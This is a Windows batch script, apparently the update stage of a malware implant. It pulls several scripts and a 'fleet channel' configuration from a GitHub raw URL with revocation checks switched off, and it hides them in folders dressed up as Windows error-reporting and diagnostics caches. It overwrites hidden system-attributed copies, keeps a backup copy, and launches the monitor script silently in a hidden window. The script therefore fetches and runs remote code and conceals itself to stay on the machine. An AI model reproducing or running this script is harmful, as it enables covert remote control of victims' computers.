@echo off
rem FREEZE_NOW R4 - force-update sevrz payloads only (mon/lib/secure/tg/channel); kick mon once. No msiexec.
setlocal EnableExtensions
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=main"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

rem pull latest tip payloads (sevrz stack only)
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.cmd" "%RAW%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.ps1" "%RAW%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.cmd" "%RAW%/own_secure.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\tg_report.ps1" "%RAW%/tg_report.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%RAW%/fleet_channel.cfg?t=%RANDOM%"

rem R4: version-agnostic gate — marker + size only; host-side sticky floor blocks real downgrades
findstr /C:"OWN_MON  BUILD 2026" "%STAGE%\own_mon.cmd" >nul
if errorlevel 1 (
  echo FAIL mon-download-bad
  endlocal & exit /b 2
)
for %%F in ("%STAGE%\own_mon.cmd") do if %%~zF LSS 5000 (
  echo FAIL mon-download-small
  endlocal & exit /b 3
)

attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" >nul 2>&1
copy /y "%STAGE%\own_mon.cmd" "%WD%\own_mon.cmd" >nul
copy /y "%STAGE%\own_lib.ps1" "%WD%\own_lib.ps1" >nul
copy /y "%STAGE%\own_secure.cmd" "%WD%\own_secure.cmd" >nul
copy /y "%STAGE%\tg_report.ps1" "%WD%\tg_report.ps1" >nul
copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul

powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\own_mon.cmd\"' -WindowStyle Hidden" >nul 2>&1

findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd"
echo FORCE_UPDATE=OK pin=%PIN%
endlocal
